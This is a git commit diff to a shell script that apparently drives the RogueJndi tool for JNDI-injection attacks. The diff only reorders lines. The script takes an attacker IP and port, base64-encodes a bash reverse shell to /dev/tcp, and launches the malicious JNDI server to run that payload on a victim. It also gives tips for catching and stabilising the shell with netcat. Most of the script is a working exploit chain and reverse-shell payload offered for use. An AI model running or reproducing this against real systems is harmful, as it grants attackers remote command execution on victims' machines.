f1bb43fc1a29e13a9bd5a0864036ce40b50e3999
NaniteCrafter <a.sky.flooded.with.light@gmail.com>
2022-03-16 16:42:09 +1100

    Update

--- my_custom_script.sh
+++ my_custom_script.sh
@@ -14,11 +14,11 @@ echo "my ip:"
 read my_ip
 echo "my port:"
 read my_port
-reverse_shell=`echo 'bash -c bash -i >&/dev/tcp/'$my_ip'/'$my_port' 0>&1' |base64`
-java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,$reverse_shell}|{base64,-d}|{bash,-i}" --hostname $my_ip
-echo ""
-echo ""
-echo ""
 echo "Once this is complete and you've got a reverse shell, remember to use the following command within nc -lvnp (port)"
 echo "script /dev/null -c bash"
 echo "This will help to make the shell more useable"
+echo ""
+echo ""
+echo ""
+reverse_shell=`echo 'bash -c bash -i >&/dev/tcp/'$my_ip'/'$my_port' 0>&1' |base64`
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,$reverse_shell}|{base64,-d}|{bash,-i}" --hostname $my_ip
